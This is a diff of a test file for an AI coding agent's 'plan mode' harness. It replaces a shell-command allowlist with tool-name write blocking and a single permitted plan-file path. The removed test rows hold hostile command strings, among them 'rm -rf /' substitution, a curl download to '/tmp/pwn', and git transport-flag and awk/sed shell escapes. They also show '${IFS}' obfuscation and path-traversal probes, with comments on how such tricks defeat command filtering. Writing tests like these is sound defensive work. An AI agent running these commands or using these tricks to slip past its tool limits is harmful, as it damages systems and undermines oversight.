@@ -11,8 +11,8 @@
  *     (a helper that referenced a module-scope name would throw here first);
  *   - toggling plan mode snapshots and restores the EXACT tool set, including a
  *     `--tools` narrowing that a hardcoded "normal mode" list would resurrect;
- *   - both barriers work: `edit` leaves the active set AND a call to it is
- *     blocked, and `bash` is allowlisted;
+ *   - both barriers work: `edit`/`write` leave the active set AND a call to
+ *     them is refused — except for the one pinned plan file;
  *   - `before_agent_start` injects nothing unless plan mode is engaged, and
  *     nothing for a non-`user` message even when it is;
  *   - every new Pi API touch fails open when the host does not provide it.
@@ -23,12 +23,10 @@ import { mkdirSync, rmSync, writeFileSync } from "node:fs"
 import { join } from "node:path"
 
 import { buildPiExtensionSource } from "~/lib/pi-extension"
+import * as planModeModule from "~/lib/pi-plan-mode"
 import type { PiProfileId } from "~/lib/pi-models-settings"
 import {
-  PLAN_BLOCKED_DELEGATION,
   PLAN_BLOCKED_TOOLS,
-  PLAN_MCP_READ_TOOLS,
-  PLAN_TODO_READ_ACTIONS,
   PLAN_CONTEXT_TYPE,
   PLAN_EXEC_TYPE,
   PLAN_MODE_ENTRY,
@@ -39,8 +37,9 @@ import {
   cleanPlanStepText,
   extractDoneSteps,
   extractPlanSteps,
-  isPlanSafeCommand,
+  isPlanFilePath,
   planAllStepsComplete,
+  planFilePath,
   type PlanStep,
 } from "~/lib/pi-plan-mode"
 
@@ -164,138 +163,65 @@ const assistantMessage = (text: string) => ({
 const endEvent = (text: string) => ({ type: "agent_end", messages: [assistantMessage(text)] })
 
 describe("plan mode: pure helpers", () => {
-  test("the read-only allowlist accepts reads and refuses writes", () => {
-    for (const command of [
-      "git status",
-      "git log --oneline -5",
-      "git diff HEAD",
-      "ls -la",
-      "cat package.json",
-      "rg TODO src",
-      "npm ls",
-      "printenv PATH",
-      "date +%Y-%m-%d",
-      "sort -u in.txt",
-      // A file whose name merely starts with a blocked word is not a command.
-      "cat rm.md",
-      "ls -cp",
-      "jq -r .a f",
-      "fd -e ts",
-      "bat f",
-      // Quoted patterns are ordinary arguments once the quotes are gone, and a
-      // destructive word in ARGUMENT position is just a word being searched for.
-      "rg 'TODO: fix' src",
-      "rg tee src",
-      "grep -n dd src/x.ts",
-      "rg ln lib",
-      "echo mkdir",
-      "git log --grep=\"fix typo\"",
-      "cat 'my file.txt'",
-      // `${IFS}` in a read is still a read once it normalizes to a space.
-      "cat${IFS}/etc/passwd",
-      // The new flag denies must not swallow the read-only forms.
-      "git ls-remote .",
-      "sort -k2 f",
-      "sort -t, -k2 f",
-      "file f",
-      "file -c magic",
-      "node --version",
-      "python3 --version",
+  test("command strings are never inspected: there is no allowlist left to fool", () => {
+    // This test used to be a 130-line table of read-only commands and the
+    // metacharacter tricks that defeated them (`sed -n '1e sh'`,
+    // `awk 'BEGIN{system("sh")}'`, `find${IFS}.-delete`), which is exactly why it
+    // is gone: a command string cannot be classified by a pattern, and a row
+    // added for a new trick never covered the next one. Plan mode now refuses
+    // writes by TOOL, so every one of those commands is allowed — and a shell is
+    // allowed to do read-only work with it. The guard being deleted is asserted
+    // here so a well-meaning revert cannot bring the table back silently.
+    const exported = planModeModule as unknown as Record<string, unknown>
+    for (const deleted of [
+      "isPlanSafeCommand",
+      "PLAN_READ_TOOLS",
+      "PLAN_BLOCKED_SHELLS",
+      "PLAN_MCP_READ_TOOLS",
+      "PLAN_BLOCKED_DELEGATION",
+      "PLAN_TODO_READ_ACTIONS",
     ]) {
-      expect(isPlanSafeCommand(command)).toBe(true)
+      expect(exported[deleted]).toBeUndefined()
     }
-    for (const command of [
-      "rm -rf dist",
-      "git commit -m wip",
-      "git push",
-      "npm install left-pad",
-      "sudo ls",
-      "echo hi > file.txt",
-      "tee out.txt",
-      "mv a b",
-      // An allowlisted prefix must not launder a second command.
-      "git log && rm -rf dist",
-      "ls | xargs rm",
-      "ls $(rm -rf /)",
-      "git diff `whoami`",
-      // Read-only-LOOKING first words with a write in the flags.
-      "find . -delete",
-      "find . -name '*.ts' -exec rm {} \\;",
-      "sort -o out.txt in.txt",
-      "uniq in.txt out.txt",
-      "tree -o out.txt",
-      "npm audit fix",
-      "date -s 2020-01-01",
-      "git log --output=out.txt",
-      // Script interpreters that can shell out with no metacharacter at all.
-      "sed -n '1e sh' file",
-      "awk 'BEGIN{system(\"sh\")}'",
-      // Launchers that run a program the allowlist never inspected.
-      "env python3 -c 'open(\"x\",\"w\").write(\"hi\")'",
-      "env node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'",
-      "env sh -c 'date'",
-      // Clock writes with no -s flag.
-      "date 0101000020",
-      "date -j 0101000020",
-      // Programs named by a flag rather than the command line.
-      "sort --compress-program=sh in.txt",
-      "git diff --ext-diff",
-      "git log --textconv",
-      // No-space output flags.
-      "sort -oout.txt in.txt",
-      "tree -oout.txt",
-      // Quoting, backslashes and `${IFS}` are handled by the shell, not by us:
-      // every spelling below runs the same denying flag, so all must be refused.
-      "find . -del''ete",
-      "find . -del\\ete",
-      "find . -'delete'",
-      'find . "-delete"',
-      "sort '-o' out in.txt",
-      "jq '-i' . f",
-      "fd '-x' sh",
-      "find${IFS}.${IFS}-delete",
-      "sort${IFS}-o${IFS}out${IFS}in.txt",
-      "tree${IFS}-o${IFS}out",
-      "jq${IFS}-i${IFS}.${IFS}f",
-      "fd${IFS}-x${IFS}sh",
-      // A variable can expand to a flag, and no reading of the text tells which.
-      "find . $FLAG",
-      "ls $HOME",
-      // A bare `&` runs a second command, with or without spaces, and `${IFS}`
-      // defeats the destructive list's command-position anchor.
-      "ls & node -e 'x'",
-      "ls&node -e 'x'",
-      "ls${IFS}&${IFS}rm${IFS}-rf${IFS}/tmp/x",
-      "ls & curl -s http://x/y -o /tmp/pwn",
-      // Process substitution is a pipe without a pipe character.
-      "cat <(node -e 'x')",
-      "cat >(node -e 'x')",
-      // A program named by a git transport flag.
-      "git ls-remote --upload-pack='touch /tmp/pwn' .",
-      "git ls-remote --receive-pack=x .",
-      "git log --exec=x",
-      // Flag-selected writers behind read-only-looking tools. The `-T` deny is
-      // case-sensitive so sort's `-t,` field separator is not caught by it.
-      "sort -T /tmp/x in.txt",
-      "sort -To out.txt in.txt",
-      "file -C -m magic",
-      // `--version` must not license trailing tokens.
-      "node --version -e 'x'",
-      "python3 --version -c 'x'",
-      // In-place / exec-shaped flags on read-looking tools.
-      "jq -i . f",
-      "jq --in-place '.a=1' f",
-      "fd -x sh",
-      "fd --exec sh",
-      "fd -X sh",
-      'bat --pager="sh -c id" f',
-      "less -o log f",
-      "more f",
+  })
+
+  test("the plan file is the only path the write barrier admits", () => {
+    const cwd = "/repo"
+    const plan = planFilePath()
+    expect(plan).toBe(".github-router/plans/pi-plan/plan.md")
+    for (const accepted of [
+      plan,
+      "/repo/" + plan,
+      "./" + plan,
+      ".github-router/plans/pi-plan/../pi-plan/plan.md",
+      "/repo/.github-router//plans/pi-plan/plan.md",
+    ]) {
+      expect(isPlanFilePath(cwd, accepted, plan)).toBe(true)
+    }
+    // Everything else — neighbours, parents, look-alikes, and the classic
+    // "traversal that lands somewhere else" — is a write, and writes are refused.
+    for (const refused of [
       "",
       "   ",
+      "plan.md",
+      ".github-router/plans/pi-plan/other.md",
+      ".github-router/plans/pi-claude-parity/plan.md",
+      ".github-router/plans/pi-plan/plan.md.bak",
+      ".github-router/plans/pi-plan",
+      "../plan.md",
+      // Traversal that climbs out and lands somewhere else. (Note that
+      // "../repo/<plan>" DOES resolve to the plan file and is correctly
+      // admitted — the check is on the resolved path, not the spelling.)
+      "../other/" + plan,
+      "/repo/.github-router/plans/pi-plan/plan.md/../../secret.ts",
+      "/etc/passwd",
+      "src/lib/pi-plan-mode.ts",
     ]) {
-      expect(isPlanSafeCommand(command)).toBe(false)
+      expect(isPlanFilePath(cwd, refused, plan)).toBe(false)
     }
+    // A non-string argument is a refusal, not a crash.
+    expect(isPlanFilePath(cwd, undefined, plan)).toBe(false)
+    expect(isPlanFilePath(cwd, 42, plan)).toBe(false)
   })
 
   test("a plan that numbers from 5 keeps its numbers so [DONE:5] matches", () => {
@@ -377,7 +303,7 @@ describe("plan mode: emission", () => {
 
   test("the embedded helpers are verbatim copies of the tested functions", () => {
     const section = buildPiPlanModeSection().join("\n")
-    expect(section).toContain(isPlanSafeCommand.toString())
+    expect(section).toContain(isPlanFilePath.toString())
     expect(section).toContain(extractPlanSteps.toString())
     expect(section).toContain(applyDoneSteps.toString())
     expect(section).toContain(planAllStepsComplete.toString())
@@ -416,115 +342,123 @@ describe("plan mode: generated module runs", () => {
     expect(harness.tools.active).toEqual(["read", "bash", "edit", "write"])
   })
 
-  test("write tool calls are blocked by name even without the tool-set barrier", async () => {
-    const harness = await loadPlanExtension("block-tools", stubPi())
+  test("only the writer tools are refused; everything else a planner needs runs", async () => {
+    const harness = await loadPlanExtension(
+      "block-tools",
+      stubPi({ activeTools: ["read", "bash", "powershell", "subagent", "todo", "edit", "write"] }),
+    )
     const ctx = ctxFor(harness)
     const toolCall = harness.handlers.get("tool_call")!
 
     // Off: nothing blocked.
-    expect(await toolCall({ toolName: "edit", input: {} }, ctx)).toBeUndefined()
+    expect(await toolCall({ toolName: "edit", input: { path: "src/x.ts" } }, ctx)).toBeUndefined()
 
     await harness.commands.get("plan")!.handler("", ctx)
-    for (const toolName of [...PLAN_BLOCKED_TOOLS, ...PLAN_BLOCKED_DELEGATION]) {
-      const result = (await toolCall({ toolName, input: {} }, ctx)) as { block?: boolean }
-      expect(result?.block).toBe(true)
+
+    // Writers are refused by name, whatever the arguments claim.
+    for (const toolName of PLAN_BLOCKED_TOOLS) {
+      for (const input of [undefined, {}, { path: "src/lib/launch.ts" }, { file_path: "src/a.ts" }]) {
+        const result = (await toolCall({ toolName, input }, ctx)) as { block?: boolean }
+        expect(result?.block).toBe(true)
+      }
     }
-    const powershell = (await toolCall({ toolName: "powershell", input: {} }, ctx)) as {
-      block?: boolean
+
+    // Everything that is not a writer passes, with no argument inspection at
+    // all. Each of these used to be refused by a separate rule: destructive bash
+    // by the command table, `powershell` by an asymmetry, `subagent`/`workflow`
+    // by the delegation block, MCP servers by namespace, and todo writes by a
+    // read-action allowlist. A frontier model told "plan, do not implement" does
+    // not need the harness to re-litigate any of it, and each rule cost real
+    // planning capability (`git log`, a build, a delegated survey of the repo).
+    const allowed: Array<[string, unknown]> = [
+      ["bash", { command: "git log --oneline -5" }],
+      ["bash", { command: "bun test tests/launch.test.ts" }],
+      ["powershell", { command: "Get-ChildItem" }],
+      ["subagent", { agent: "Explore", task: "map the launcher" }],
+      ["subagent_launch", { agent: "General-Purpose", task: "x" }],
+      ["workflow", { script: "..." }],
+      ["todo", { action: "create", title: "x" }],
+      ["todo", { action: "update", id: "x" }],
+      ["mcp__gh-router-peers__implement", {}],
+      ["mcp__gh-router-cloudagent__create_job", {}],
+      ["tool_search", { query: "mcp" }],
+      ["read", { path: "src/lib/launch.ts" }],
+      ["grep", { pattern: "SIGWINCH" }],
+    ]
+    for (const [toolName, input] of allowed) {
+      expect(await toolCall({ toolName, input }, ctx)).toBeUndefined()
     }
-    expect(powershell?.block).toBe(true)
   })
 
-  test("todo reads are allowed in plan mode and todo writes are refused", async () => {
-    // `todo` is file-backed, so its writers are writes. Blocking the whole tool
-    // would also take away `list`, which a planning turn legitimately wants.
-    const harness = await loadPlanExtension("todo-gate", stubPi({ activeTools: ["read", "bash", "todo"] }))
-    const ctx = ctxFor(harness)
+  test("the pinned plan file is written through the refused tool", async () => {
+    // The one exception, end to end: `write` is in PLAN_BLOCKED_TOOLS and is
+    // still allowed for exactly this path. Claude Code's plan mode is a
+    // one-write mode, and without this the model has no way to produce the
+    // artifact the user is meant to read and approve.
+    const harness = await loadPlanExtension("plan-file", stubPi())
+    const ctx = ctxFor(harness, { cwd: "/work/repo" })
     const toolCall = harness.handlers.get("tool_call")!
     await harness.commands.get("plan")!.handler("", ctx)
 
-    for (const action of PLAN_TODO_READ_ACTIONS) {
-      expect(await toolCall({ toolName: "todo", input: { action } }, ctx)).toBeUndefined()
-    }
-    for (const action of ["create", "update", "append", "delete", "claim", "release", "", undefined]) {
-      const result = (await toolCall({ toolName: "todo", input: { action } }, ctx)) as {
+    expect(
+      await toolCall({ toolName: "write", input: { path: planFilePath(), content: "# plan" } }, ctx),
+    ).toBeUndefined()
+    expect(
+      await toolCall(
+        { toolName: "write", input: { path: "/work/repo/" + planFilePath(), content: "# plan" } },
+        ctx,
+      ),
+    ).toBeUndefined()
+    // An edit of the same file is the same permission (upstream's plan file is
+    // an editable Doc, not an append-only log).
+    expect(
+      await toolCall({ toolName: "edit", input: { path: planFilePath(), oldText: "a", newText: "b" } }, ctx),
+    ).toBeUndefined()
+
+    // The exception cannot widen: a sibling file, a look-alike, or a traversal
+    // out of the directory is a normal write and stays refused.
+    for (const path of [
+      "src/lib/launch.ts",
+      ".github-router/plans/pi-plan/notes.md",
+      ".github-router/plans/other/plan.md",
+      "plan.md",
+      "../plan.md",
+      planFilePath() + "/../../evil.ts",
+    ]) {
+      const result = (await toolCall({ toolName: "write", input: { path, content: "x" } }, ctx)) as {
         block?: boolean
+        reason?: string
       }
       expect(result?.block).toBe(true)
+      expect(result?.reason).toContain(planFilePath())
     }
-    // `todo` stays in the active set: the read actions are legitimate.
-    expect(harness.tools.active).toEqual(["read", "bash", "todo"])
-  })
-
-  test("MCP tools are denied by namespace, except the read-only allowlist", async () => {
-    // The active-set barrier cannot cover these: MCP servers are published
-    // `deferred`, so their tools were never in the snapshot plan mode narrowed
-    // and `tool_search` can activate one at any point. A name is not evidence
-    // either — `__explore` reads, `__implement` edits files in a worktree.
-    const harness = await loadPlanExtension(
-      "mcp",
-      stubPi({ activeTools: ["read", "bash", "mcp__gh-router-peers__implement"] }),
-    )
-    const ctx = ctxFor(harness)
-    const toolCall = harness.handlers.get("tool_call")!
-    await harness.commands.get("plan")!.handler("", ctx)
-
-    for (const toolName of [
-      "mcp__gh-router-peers__implement",
-      "mcp__gh-router-peers__test",
-      "mcp__gh-router-peers__explore",
-      "mcp__gh-router-peers__oracle",
-      "mcp__gh-router-peers__worker_defaults",
-      "mcp__gh-router-cloudagent__create_job",
-      "mcp__gh-router-ado__create_work_item",
-    ]) {
-      const result = (await toolCall({ toolName, input: {} }, ctx)) as { block?: boolean }
-      expect(result?.block).toBe(true)
-    }
-    for (const toolName of PLAN_MCP_READ_TOOLS) {
-      expect(await toolCall({ toolName, input: {} }, ctx)).toBeUndefined()
-    }
-    // Pi's own resource readers carry no `mcp__` prefix and are marked
-    // readOnlyHint, so the namespace rule leaves them alone.
-    for (const toolName of ["list_mcp_resources", "read_mcp_resource"]) {
-      expect(await toolCall({ toolName, input: {} }, ctx)).toBeUndefined()
-    }
-    // The visible half: an MCP writer that was in the snapshot leaves the set.
-    expect(harness.tools.active).toEqual(["read", "bash"])
-    await harness.commands.get("plan")!.handler("", ctx)
-    expect(harness.tools.active).toEqual(["read", "bash", "mcp__gh-router-peers__implement"])
-  })
-
-  test("the active set drops delegation too, and restores it verbatim", async () => {
-    // A child session has its own tool roster, so the mode cannot gate what a
-    // delegated agent writes. Removing `subagent` from the active set is the
-    // visible half of that barrier; the tool_call refusal is the other half.
-    const harness = await loadPlanExtension(
-      "delegation",
-      stubPi({ activeTools: ["read", "bash", "subagent", "edit"] }),
-    )
-    const plan = harness.commands.get("plan")!
-    await plan.handler("", ctxFor(harness))
-    expect(harness.tools.active).not.toContain("subagent")
-    await plan.handler("", ctxFor(harness))
-    expect(harness.tools.active).toEqual(["read", "bash", "subagent", "edit"])
-  })
-
-  test("bash is allowlisted in plan mode only", async () => {
-    const harness = await loadPlanExtension("bash-gate", stubPi())
-    const ctx = ctxFor(harness)
-    const toolCall = harness.handlers.get("tool_call")!
-
-    expect(await toolCall({ toolName: "bash", input: { command: "rm -rf dist" } }, ctx)).toBeUndefined()
-    await harness.commands.get("plan")!.handler("", ctx)
-    expect(
-      (await toolCall({ toolName: "bash", input: { command: "git status" } }, ctx)) as unknown,
-    ).toBeUndefined()
-    const blocked = (await toolCall(
-      { toolName: "bash", input: { command: "git commit -m x" } },
+    // `apply_patch` has no single target to check, so it has no exception.
+    const patch = (await toolCall(
+      { toolName: "apply_patch", input: { patch: "*** Begin Patch" } },
       ctx,
     )) as { block?: boolean }
-    expect(blocked?.block).toBe(true)
+    expect(patch?.block).toBe(true)
+  })
+
+  test("the plan file is still writable after a toggle round trip", async () => {
+    // Guards against the exception being wired to a closure that the exit path
+    // resets: a second planning session must behave like the first.
+    const harness = await loadPlanExtension("plan-file-roundtrip", stubPi())
+    const ctx = ctxFor(harness, { cwd: "/work/repo" })
+    const plan = harness.commands.get("plan")!
+    const toolCall = harness.handlers.get("tool_call")!
+
+    await plan.handler("", ctx)
+    await plan.handler("", ctx)
+    await plan.handler("", ctx)
+    expect(
+      await toolCall({ toolName: "write", input: { path: planFilePath(), content: "x" } }, ctx),
+    ).toBeUndefined()
+    expect(
+      ((await toolCall({ toolName: "write", input: { path: "src/x.ts", content: "x" } }, ctx)) as {
+        block?: boolean
+      })?.block,
+    ).toBe(true)
   })
 
   test("before_agent_start injects nothing at rest and nothing for a non-user turn", async () => {
@@ -544,6 +478,43 @@ describe("plan mode: generated module runs", () => {
     expect(result?.message?.display).toBe(false)
     expect(result?.message?.content).toContain("[PLAN MODE ACTIVE]")
     expect(result?.message?.content).not.toContain("systemPrompt")
+  })
+
+  test("the injected brief carries the frontier planning contract", async () => {
+    // The prompt IS the mechanism now: with the command table gone, these
+    // sentences are what keeps a capable model in planning mode. Pinning them
+    // keeps a future edit from quietly dropping the parts that matter.
+    const harness = await loadPlanExtension("brief", stubPi())
+    const ctx = ctxFor(harness)
+    await harness.commands.get("plan")!.handler("", ctx)
+    const result = (await harness.handlers.get("before_agent_start")!(
+      { messageType: "user", prompt: "hi" },
+      ctx,
+    )) as { message?: { content: string } }
+    const brief = result.message!.content
+
+    // The closed door, the one exception, and the precedence claim.
+    expect(brief).toContain("[PLAN MODE ACTIVE]")
+    expect(brief).toContain("must not edit files")
+    expect(brief).toContain("supersedes")
+    expect(brief).toContain(planFilePath())
+    // Everything else is explicitly open, so the model does not under-use its
+    // tools now that no allowlist tells it what is read-only.
+    expect(brief).toContain("Read, search, and run read-only commands")
+    // Claude Code's five phases, compressed: reuse, ask once, decision-complete
+    // design, the plan file's sections, and hand over.
+    expect(brief).toContain("what already exists")
+    expect(brief).toContain("never")
+    expect(brief).toContain("no open decisions left")
+    expect(brief).toContain("recommended approach only")
+    expect(brief).toContain("verification")
+    // Codex's strict-mode rule and the approval norm.
+    expect(brief).toContain("Do NOT open an ask_user")
+    expect(brief).toContain("Leaving plan mode is")
+    // Codex's planning-vs-doing test, in one sentence.
+    expect(brief).toContain("DOING the work")
+    // The brief must never grow into the enumeration it replaced.
+    expect(brief.length).toBeLessThan(2600)
   })
 
   test("the status badge and checklist widget follow the mode", async () => {
